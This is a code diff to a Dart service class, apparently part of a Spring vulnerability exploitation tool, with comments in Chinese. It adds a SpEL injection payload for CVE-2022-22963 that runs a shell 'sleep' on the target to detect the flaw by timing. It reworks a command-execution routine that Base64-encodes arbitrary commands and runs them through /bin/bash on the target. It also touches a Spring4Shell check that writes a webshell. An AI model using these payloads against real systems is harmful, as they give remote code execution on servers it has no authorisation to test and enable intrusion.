@@ -102,20 +102,50 @@ class SpringExpService {
   }
 
   // CVE-2022-22963: Spring Cloud Function routing-expression SpEL
+  //
+  // 注意：漏洞触发时服务端通常返回 **500 + 不含任何 SpEL 关键字的 JSON**，
+  // 靠响应体特征判断会漏报（vulhub spring-cloud-function:3.2.2 实测：
+  // 靶场可执行 `touch /tmp/pwned`，但响应体只有 generic error）。
+  // 因此以 **时间侧信道** 为主：表达式内 `sleep` 会让响应被推迟。
   Future<ExpResult> checkSpringCloudFunction() async {
+    const name = 'CVE-2022-22963';
+    const sleepSeconds = 3;
+    final uri = Uri.parse('${baseUri}functionRouter');
     try {
-      final detect = await http.post(
-        Uri.parse('${baseUri}functionRouter'),
-        headers: {
-          'spring.cloud.function.routing-expression': '233*233',
-          'Content-Type': 'text/plain',
-        },
-        body: 'test',
-      ).timeout(timeout);
+      // 基线：普通请求，量出正常往返耗时。
+      final baseline = Stopwatch()..start();
+      await http
+          .post(uri, headers: {'Content-Type': 'text/plain'}, body: 'test')
+          .timeout(timeout);
+      baseline.stop();
 
+      final probe = Stopwatch()..start();
+      final detect = await http
+          .post(
+            uri,
+            headers: {
+              // 必须 waitFor：Runtime.exec 是非阻塞的，只发 exec 不会拖慢响应。
+              'spring.cloud.function.routing-expression':
+                  'T(java.lang.Runtime).getRuntime().exec("sleep $sleepSeconds").waitFor()',
+              'Content-Type': 'text/plain',
+            },
+            body: 'test',
+          )
+          .timeout(timeout);
+      probe.stop();
+
+      final deltaMs = probe.elapsedMilliseconds - baseline.elapsedMilliseconds;
+      if (deltaMs >= 2000) {
+        return ExpResult(
+          true,
+          name,
+          'SpEL 表达式被执行：注入 sleep $sleepSeconds 使响应延迟 ${deltaMs}ms（基线 ${baseline.elapsedMilliseconds}ms）',
+        );
+      }
+
+      // 兼容部分部署：错误页直接回显 SpEL 类名/表达式。
       final lower = detect.body.toLowerCase();
       final indicators = <String>[
-        '54289',
         'spel',
         'org.springframework.expression',
         'spring.cloud.function.routing-expression',
@@ -124,16 +154,22 @@ class SpringExpService {
         'evaluationexception',
         'parseexception',
       ];
-      final hasSpelFeature = indicators.any(lower.contains);
-      if (hasSpelFeature) {
+      if (indicators.any(lower.contains)) {
         return ExpResult(
           true,
-          'CVE-2022-22963',
-          'Spring Cloud Function routing-expression 返回 SpEL 解析/求值特征（状态 ${detect.statusCode}）',
+          name,
+          '响应体含 SpEL 求值特征（状态 ${detect.statusCode}）',
         );
       }
-    } catch (_) {}
-    return ExpResult(false, 'CVE-2022-22963', '');
+
+      return ExpResult(
+        false,
+        name,
+        '未观察到延迟侧信道（Δ${deltaMs}ms，HTTP ${detect.statusCode}）',
+      );
+    } catch (e) {
+      return ExpResult.probeFailed(name, '探测失败: $e');
+    }
   }
 
   // CVE-2022-22965 (Spring4Shell): ClassLoader 写 Webshell
@@ -162,7 +198,9 @@ class SpringExpService {
       if (verify.statusCode == 200 && verify.body.contains(marker)) {
         return ExpResult(true, 'CVE-2022-22965 (Spring4Shell)', '可利用：成功写入并回显验证文件 $shellName');
       }
-    } catch (_) {}
+    } catch (e) {
+      return ExpResult.probeFailed('CVE-2022-22965 (Spring4Shell)', '探测失败: $e');
+    }
     return ExpResult(false, 'CVE-2022-22965 (Spring4Shell)', '');
   }
 
@@ -218,8 +256,9 @@ class SpringExpService {
         'CVE-2018-1273',
         '$hint（HTTP ${res.statusCode}, Content-Type: $contentType, 片段: $shortPreview）',
       );
-    } catch (_) {}
-    return ExpResult(false, 'CVE-2018-1273', '请求异常或超时，未拿到可用于判定的响应');
+    } catch (e) {
+      return ExpResult.probeFailed('CVE-2018-1273', '探测失败: $e');
+    }
   }
 
   // CVE-2017-8046: Spring Data REST PATCH SpEL
@@ -264,7 +303,9 @@ class SpringExpService {
       if (hasStrongSignal(second)) {
         return ExpResult(true, 'CVE-2017-8046', 'Spring Data REST PATCH（备用 payload）返回 SpEL 异常特征（状态 ${second.statusCode}）');
       }
-    } catch (_) {}
+    } catch (e) {
+      return ExpResult.probeFailed('CVE-2017-8046', '探测失败: $e');
+    }
     return ExpResult(false, 'CVE-2017-8046', '');
   }
 
@@ -302,7 +343,9 @@ class SpringExpService {
       } finally {
         client.close();
       }
-    } catch (_) {}
+    } catch (e) {
+      return ExpResult.probeFailed('CVE-2016-4977', '探测失败: $e');
+    }
     return ExpResult(false, 'CVE-2016-4977', '');
   }
 
@@ -440,7 +483,14 @@ class SpringExpService {
   // 执行命令 - CVE-2022-22963
   Future<String?> execSpringCloudFunction(String cmd) async {
     try {
-      final spel2 = 'new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(new String[]{\"/bin/bash\",\"-c\",\"$cmd\"}).getInputStream()).useDelimiter(\"\\\\A\").next()';
+      // SpEL 的双引号字符串不支持 `\"` 转义（实测会原样保留反斜杠），
+      // 因此把命令 Base64 后传进去，用 T(java.util.Base64) 在目标端解码。
+      final b64Cmd = base64.encode(utf8.encode(cmd));
+      final spel2 =
+          'new java.util.Scanner(T(java.lang.Runtime).getRuntime()'
+          '.exec(new String[]{"/bin/bash","-c",'
+          'new String(T(java.util.Base64).getDecoder().decode("$b64Cmd"))})'
+          '.getInputStream()).useDelimiter("\\\\A").next()';
       final res = await http.post(
         Uri.parse('${baseUri}functionRouter'),
         headers: {
